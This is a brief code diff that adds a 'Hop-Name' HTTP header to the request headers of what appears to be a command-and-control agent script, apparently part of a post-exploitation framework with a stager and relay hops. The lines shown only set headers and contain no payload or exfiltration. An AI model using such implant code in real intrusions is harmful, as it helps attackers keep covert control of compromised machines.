@@ -42,6 +42,10 @@ headersRaw = parts[2:]
 #   sessionID is set by stager.py
 # headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
 headers = {'User-Agent': userAgent}
+try:
+    headers['Hop-Name'] = hop
+except:
+    pass
 
 # parse the headers into the global header dictionary
 for headerRaw in headersRaw:
